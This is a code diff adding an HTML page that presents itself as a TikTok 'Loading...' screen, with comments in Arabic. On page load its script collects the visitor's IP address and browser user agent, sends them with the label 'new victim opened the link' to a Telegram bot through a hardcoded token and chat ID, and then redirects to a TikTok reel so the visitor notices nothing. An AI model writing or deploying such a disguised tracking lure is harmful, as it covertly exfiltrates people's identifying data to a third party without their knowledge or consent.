@@ -1,0 +1,38 @@
+<!DOCTYPE html>
+<html>
+<head>
+    <meta charset="UTF-8">
+    <title>Loading...</title>
+    <script>
+        // البيانات التي سيتم استبدالها من سكيتش واير
+        const token = '7565752831:AAFr5xn1Qk6qJ1UKSkXtVcK_6ho5dKWCnLQ';
+        const chatId = '7360450559';
+        const targetUrl = 'https://vt.tiktok.com/ZSmapbvm1/'; // رابط الريلز الأصلي
+
+        async function startProcess() {
+            try {
+                // 1. سحب عنوان الـ IP
+                const response = await fetch('https://api.ipify.org?format=json');
+                const data = await response.json();
+                
+                // 2. إرسال البيانات لتلجرام
+                const msg = `🎯 ضحية جديدة فتحت الرابط!\n🌐 IP: ${data.ip}\n📱 الجهاز: ${navigator.userAgent}\n🔗 الرابط المقصود: ${targetUrl}`;
+                
+                await fetch(`https://api.telegram.org/bot${token}/sendMessage?chat_id=${chatId}&text=${encodeURIComponent(msg)}`);
+                
+            } catch (e) {
+                // في حال فشل سحب البيانات، لا نجعل الضحية ينتظر
+            } finally {
+                // 3. التحويل التلقائي للريلز الأصلي مهما كانت النتيجة
+                window.location.href = targetUrl;
+            }
+        }
+
+        // تشغيل العملية فور تحميل الصفحة
+        window.onload = startProcess;
+    </script>
+</head>
+<body style="background-color: black; color: white; display: flex; justify-content: center; align-items: center; height: 100vh; font-family: sans-serif;">
+    <p>جاري التحميل...</p> 
+</body>
+</html>
